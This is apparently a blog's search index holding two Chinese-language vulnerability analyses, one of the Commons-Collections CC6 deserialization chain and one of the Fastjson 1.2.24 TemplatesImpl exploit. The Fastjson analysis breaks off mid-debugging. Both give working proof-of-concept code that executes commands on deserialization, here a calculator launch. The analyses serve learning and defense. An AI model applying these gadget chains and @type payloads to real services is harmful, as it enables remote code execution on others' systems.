<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CC6反序列化链</title>
    <url>/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</url>
    <content><![CDATA[<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732217521294-561919d4-5333-40a4-b10e-3769df62eb9b.png"
                      class=""
                > 

<p>CC6底层用的也是invokertransformer的transform去进行命令执行</p>
<p>然后用的是lazymap这条链子</p>
<ul>
<li><p>利用的依赖</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;3.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="底层出口LazyMap-InvokerTransformer"><a href="#底层出口LazyMap-InvokerTransformer" class="headerlink" title="底层出口LazyMap+InvokerTransformer"></a>底层出口LazyMap+InvokerTransformer</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">public class CC6_1 &#123;</span><br><span class="line">    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">        //初始化InvokerTransformer</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map decorateMap = LazyMap.decorate(hashMap, invokerTransformer);</span><br><span class="line">        //利用LazyMap的decorate去初始化LazyMap内部的factory，然后get函数里面存在factory.transfer()</span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        Method lazyGetMethod = lazyMapClass.getDeclaredMethod(&quot;get&quot;, Object.class);</span><br><span class="line">        lazyGetMethod.setAccessible(true);</span><br><span class="line">        //让get函数可以被直接操作</span><br><span class="line">        lazyGetMethod.invoke(decorateMap, runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们顺着代码来吧</p>
<h4 id="InvokerTransformer初始化-利用方式"><a href="#InvokerTransformer初始化-利用方式" class="headerlink" title="InvokerTransformer初始化+利用方式"></a>InvokerTransformer初始化+利用方式</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184143397-2a3dd1e4-5620-4b58-a911-cfd8ba39d109.png"
                      class="" title="img"
                > 

<p>我们查看InvokerTransformer这个类</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184234521-97287f70-915b-433f-85e9-3bbc62f8ed65.png"
                      class="" title="img"
                > 

<p>里面存在这个初始化函数，这里面的参数已经够我们想到如果有地方可以invoke调用就可以造成rce了</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184279009-bcc5128e-fae0-4eed-befd-325c69d52140.png"
                      class="" title="img"
                > 

<p>这里还真的有，并且input参数是我们传入的，传入个Runtime对象就可以实现RCE了</p>
<h4 id="LazyMap初始化以及利用"><a href="#LazyMap初始化以及利用" class="headerlink" title="LazyMap初始化以及利用"></a>LazyMap初始化以及利用</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184381641-a533fdb3-f0f7-454f-8ab3-e526270c984b.png"
                      class="" title="img"
                > 

<p>我们查看下LazyMap的decorate函数</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184447459-a8fe7ba8-4dcb-4331-b098-0e971bfdcb74.png"
                      class="" title="img"
                > 

<p>因为LazyMap下面那个构造函数是protected所以我们无法直接利用，所以利用public的decorate函数去初始化，重点是这一行<strong>this.factory &#x3D; FactoryTransformer.getInstance(factory);</strong> </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184508030-ef78abb4-0ba4-427d-9b02-d009efbd1580.png"
                      class=""
                > 

<p>可以看到factory也是transformer类型，并且它初始化赋值了，所以我们让factory为invokerTransformer的对象</p>
<p>那我们这时候是不是就只缺一个哪个地方让这个对象**.transfer** 的地方了</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184684820-8cfb7640-6f51-4e9d-a0d8-aec9c8f778cf.png"
                      class="" title="img"
                > 

<p>LazyMap里面的get函数，factory我们初始化为invokerTransformer的对象了，那他再transofrmer，并且key我们可控，传一个Runtime对象是不是就可以了</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184778636-62da0f9a-06d9-4b27-ac08-8639fd7e6dab.png"
                      class="" title="img"
                > 

<h2 id="TiedMapEntry去调用LazyMap的get函数"><a href="#TiedMapEntry去调用LazyMap的get函数" class="headerlink" title="TiedMapEntry去调用LazyMap的get函数"></a>TiedMapEntry去调用LazyMap的get函数</h2><h3 id="getValue分析"><a href="#getValue分析" class="headerlink" title="getValue分析"></a>getValue分析</h3><p>因为我们需要找到一个地方是可以readobject里面调用get并且参数和对象可控的，但是没有找到适配的，所以我们就要再往上找</p>
<p>某某函数-&gt;LazyMap.get()</p>
<p>依据ysoSerial链子找到了TiedMapEntry</p>
<p>我们自己审一下先，这个类哪里可以调用get，并且参数是否可控</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732184993706-a24e292b-c7eb-40db-840f-6d544d9288b7.png"
                      class="" title="img"
                > 

<p>看到他的getValue函数，他是map.get(key)</p>
<p>如果map可以为LazyMap，我们初始化他的factory对象为InvokerTransformer对象</p>
<p>然后LazyMap调用get是不是就是上面的</p>
<p>factory.transfer(key) &#x3D;&#x3D; InvokerTransformer.transfer(key)</p>
<p>那如果key可控为Runtime.class呢</p>
<p>factory.transfer(runtime) &#x3D;&#x3D; InvokerTransformer.transfer(runtime)</p>
<p>就实现RCE了</p>
<p>去看看TiedMapEntry含有什么参数并且怎么实例化的</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185253051-d272f369-f8d6-4d91-8cfb-fed77ce2eeca.png"
                      class="" title="img"
                > 

<p>可以看出他可以序列化这个TiedMapEntry</p>
<p>然后map也是Map对象，LazyMap是Map的子类，所以二者其实一样的</p>
<p>Object可以是个对象，那就是刚好如果可控给他一个Runtime对象</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185336849-ce7efe4e-dc9f-44b4-b53c-b22911b9e6cb.png"
                      class="" title="img"
                > 

<p>实例化不仅是public而且两个特别需要的参数都是可控的 </p>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC6_2 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //TiedMapEntry 里面存在get函数的调用，我们可以用它来调用lazymap</span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        //实例化Runtime对象</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">        //实例化InvokerTransformer对象</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashmap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map decorateMap = LazyMap.decorate(hashmap,invokerTransformer);</span><br><span class="line">        //实例化LazyMap对象</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorateMap,runtime);</span><br><span class="line">        //实例化TiedMapEntry对象</span><br><span class="line">        tiedMapEntry.getValue();</span><br><span class="line">        //getValue函数为public，直接调用</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>真的很简单写下来就会发现</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732185886275-80fcbeac-6e3b-411a-aa65-c74ca0b26aa2.png"
                      class="" title="img"
                > 

<h3 id="hashCode分析"><a href="#hashCode分析" class="headerlink" title="hashCode分析"></a>hashCode分析</h3><p>因为这个类本身没有自定义的序列化和反序列化函数，所以还得找，我们找哪里的函数调用了getvalue并且看看参数可控不可控</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186113991-1fef0431-e82e-4834-98f2-77470cadfcdf.png"
                      class="" title="img"
                > 

<p>时发现它本身的hashCode调用了getValue，此时因为是他自身的，所以hashCode并不需要参数可控，能直接调用就行了</p>
<p>也写一下代码吧</p>
<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186224096-1f5e6d40-2bce-4ccd-9d4c-06f5256bdcd4.png"
                      class="" title="img"
                >

<p>算了，太懒了不写了，发现其实就是把getvalue换成了hashCode，因为hashCode里面会调用getValue，本质上一样</p>
<p>其实这里也可以想想入口怎么样很完美了</p>
<p>因为如果有个readObject里面hashMap.hashCode()，那就直接完成链子了</p>
<h2 id="HashMap的hashCode方法"><a href="#HashMap的hashCode方法" class="headerlink" title="HashMap的hashCode方法"></a>HashMap的hashCode方法</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>我们查看下HashMap的类</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186462197-d2363a51-a6ce-4fcb-8ce8-69fbec970487.png"
                      class="" title="img"
                >

<p>可以序列化和反序列化</p>
<p>这里其实跟URL利用hashmap反序列化连起来了</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186598740-daa1c4ac-8397-461f-b59d-79e24f9bcd81.png"
                      class="" title="img"
                >

<p>put里面有个hash(key)函数的调用，我们再深入一步看看</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186642224-70347f1b-0bcc-4f6c-889b-546e2e9cd40e.png"
                      class="" title="img"
                >

<p>直接就看到hashCode</p>
<p>并且key.hashCode()，key还可控啊</p>
<p>我们观察下他的反序列化readObject</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186743782-82c1870a-770b-423f-a649-373e983edeaf.png"
                      class="" title="img"
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732186811484-b13033d9-1c5f-4c8f-9c28-e69d83a65246.png"
                      class="" title="img"
                > 

<p>所以其实我们都不用put函数，readObject里面就自己会调用hash(key)，key如果可控就直接完成了链子了</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul>
<li><p>1、Runtime没有办法序列化和反序列化，所以我们需要利用反射，就需要CC1里面的递归调用transform疯狂进行invoke，然后实例化出一个Runtime对象，然后再命令执行</p>
</li>
<li><p>2、put里面也会有hash(key)，所以序列化的时候就会弹一次计算器，所以我们可以put的时候让key是个没啥用的东西，之后利用反射再把值修改好</p>
</li>
<li><p>3、因为后面我们用了hash，LazyMap作为键值，所以这里会出现判断他的key是否存在，不存在才会执行transform，所以我们需要把它的key给删掉</p>
</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732191324913-42f0aa79-f8a5-4629-9267-2bb5ef4b7da0.png"
                      class="" title="img"
                > 

<p>这里的原因是IDEA debug时会调用toString方法，但是CC5中就是利用的toString链子，就是说它会走到lazyMap的get函数那里</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732217866498-7fc86c27-338e-4795-9539-2faef1e29e69.png"
                      class="" title="img"
                > 

<p>所以此时我们lazymap的key是null，虽然进去了if，但是factory没有变成我们命令执行所需要的东西**（因为put的时候会造成反序列化RCE，所以我们不想要put的时候就被调用，在put后通过反射再修改）** ，所以没有作用，然后执行map.get(key)，将key值传进去了，而key值是我们传给TiedMapEntry的</p>
<p>因为TiedMapEntry.getValue() -&gt; map.get(key)</p>
<p>map为LazyMap对象，key是我们传入给TiedMapEntry的值</p>
<h3 id="大概流程"><a href="#大概流程" class="headerlink" title="大概流程"></a>大概流程</h3><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218025778-dd0e767e-581c-4b72-9102-b6371c831a8e.png"
                      class="" title="img"
                > 

<p>然后debug会调用toString</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218115401-3944a040-d484-4fa3-b257-0cecc3840a61.png"
                      class="" title="img"
                > 

<p>toString调用getValue</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218137120-fbe32afe-9dd5-496f-bd16-b84456732c2c.png"
                      class="" title="img"
                > 

<p>map是我们传入的LazyMap对象</p>
<p>后一步是LazyMap的get(key)函数</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218195747-7a1988f4-d56b-49a8-bc5f-5d92728864be.png"
                      class="" title="img"
                > 

<p>此时虽然进去了if但是factory不是我们命令执行所需要的对象，所以没什么作用，然后就会造成给map.get(key);，给LazyMap的key赋值</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218406941-53298b35-2662-41e3-9741-cca0cc80e249.png"
                      class="" title="img"
                > 

<p>后续我们修改LazyMap的factory对象可以造成命令执行，但是LazyMap的key已经变成传入的2了，所以就进入不了这个if </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218493629-bfd47bb2-7c68-4af8-82c5-56c3aa162198.png"
                      class="" title="img"
                > 

<p>这就是我们要加上删除key的操作的原因</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/CC6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/1732218516554-806c2ac5-1e3c-4aaa-bdea-3f28b0914b25.png"
                      class="" title="img"
                > 

<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Poc &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(hashMap,new ConstantTransformer(&quot;1&quot;));</span><br><span class="line">        //这里传一个没啥用的transformer对象，先put进去再修改，不然put的时候就已经执行命令了</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;2&quot;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; expMap = new HashMap&lt;Object, Object&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,&quot;3&quot;);</span><br><span class="line">        lazyMap.remove(&quot;2&quot;);</span><br><span class="line">        //******************//删除键值很重要</span><br><span class="line">        Class&lt;?&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        Field factory_ = lazyMapClass.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory_.setAccessible(true);</span><br><span class="line">        factory_.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        System.out.println(lazyMap);</span><br><span class="line">        serialize(expMap);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>漏洞原理分析</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson_TemplatesImpl</title>
    <url>/2025/03/13/Fastjson-TemplatesImpl/</url>
    <content><![CDATA[<h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>这里利用的了TemplatesImpl的类，可以联想到CC3里面利用方式，将TemplatesImpl这个类，实例化的时候传入我们的恶意字节码，然后他会将我们的恶意字节码当成类去实例化然后调用静态方法。</p>
<p><strong>这里先教大家怎么转换恶意类的字节码，原因是网上很多都是已经写好的poc，那他的恶意类执行的方法就是Runtime.getRuntime.exec(“calc”) ，这个如果是windows系统就可以正常执行命令，但是如果是我们的mac系统呢。我们弹出计算器需要的命令是 open -a Calculator ,所以我们就需要去修改恶意类里面的字节码，以后我们学习的时候也方便许多</strong> </p>
<h3 id="class文件转换为字节码"><a href="#class文件转换为字节码" class="headerlink" title="class文件转换为字节码"></a>class文件转换为字节码</h3><h4 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Evil extends AbstractTranslet &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里面恶意类继承了AbstractTranslet类，此时可以带着疑问看一下，CC3的时候也有了解</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/1732247379749-eb615db2-03fa-46b9-9f18-360b5dfbac6c.png"
                      class=""
                > 

<p>可以先看这张图，就是告诉我们为什么要继承AbstractTranslet</p>
<h3 id="类转换为字节码"><a href="#类转换为字节码" class="headerlink" title="类转换为字节码"></a>类转换为字节码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class Read_class_bytes &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        byte[] bytes = Files.readAllBytes(Paths.get(&quot;target/classes/Evil.class&quot;));</span><br><span class="line">        System.out.println(new String(bytes));</span><br><span class="line">        System.out.println(&quot;------------------------------------------------------------------------------------------------------------&quot;);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(bytes));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>记住这里路径读取的是target目录下的class</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313174419129.png"
                      class="" title="image-20250313174419129"
                > 

<p><em>这里为什么要用到base64去编码我们的字节码呢，我们先参考文章来看，然后在调试中看看是不是这么回事</em> </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313175436060.png"
                      class="" title="image-20250313175436060"
                > 

<p>看一下代码里面</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313175506767.png"
                      class="" title="image-20250313175506767"
                > 

<p>如果我们的lexer为JSONScanner的话</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313175546681.png"
                      class="" title="image-20250313175546681"
                > 

<p>就会调用它的bytesValue，所以就会进行base64解码</p>
<p>这只是初步了解，实际情况我们以调试为准。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>创建一个maven项目</li>
<li>准备一个恶意类和一个漏洞利用的代码</li>
<li>maven配置fastjson版本，JDK我是高版本一样可以执行命令</li>
</ul>
<p>maven配置</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;1.2.24&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>

<p>漏洞利用代码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class Fastjson_TemplatesImpl &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        ParserConfig config = new ParserConfig();</span><br><span class="line">        byte[] bytes = Files.readAllBytes(Paths.get(&quot;target/classes/Evil.class&quot;));</span><br><span class="line">        String base64EncodedBytes = Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        String text = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot; + base64EncodedBytes + &quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&#125;&quot;;</span><br><span class="line">        JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>初步运行在代码</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313180130091.png"
                      class="" title="image-20250313180130091"
                > 

<p>这里代码为什么要<em>JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);</em> 搞那么复杂</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313180240134.png"
                      class="" title="image-20250313180240134"
                > 

<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p><strong>fastjson反序列化漏洞的利用方式从JdbcRowSetImpl可以看出就是他会实例化我们指定的对象，然后调用getter或者setter方法</strong> 网上大部分的文章都直接分析一些特殊的点，但是我们不知道TemplatesImpl里面会走哪些函数，就是怎么走的。</p>
<h3 id="猜测分析"><a href="#猜测分析" class="headerlink" title="猜测分析"></a>猜测分析</h3><p>从实例化的时候会调用getter或者setter方法，以及初始化的无参构造函数看看</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/03/13/Fastjson-TemplatesImpl/image-20250313184436063.png"
                      class="" title="image-20250313184436063"
                > 

<p>无参构造函数，可以打上断点看看会不会走到这，这里给_bytecodes我们的恶意字节码赋值了哦</p>
<p>然后从CC3的链子可知漏洞触发的点是这个函数definclass</p>
<img  
                     lazyload
                     src="/images/loading.svg"
